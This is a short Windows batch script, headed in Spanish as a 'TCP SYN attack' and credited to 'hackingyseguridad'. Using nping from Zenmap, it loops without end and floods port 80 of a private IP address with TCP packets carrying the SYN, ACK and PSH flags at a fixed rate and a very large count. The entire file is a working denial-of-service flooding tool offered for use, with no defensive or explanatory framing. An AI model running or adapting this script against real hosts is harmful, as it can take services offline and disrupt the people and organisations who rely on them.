@ECHO OFF
ECHO ATAQUE TCP SYN (c) hackingyseguridad 2016. Version 2.
ECHO Requiere tener instalado en el PC, nping incluido en Zenmap https://nmap.org/download.html
:loop
nping --tcp-connect --flags syn,ack,psh -rate=9 -c 9999999 --ttl 255 -p 80 -q 192.168.1.252
goto loop
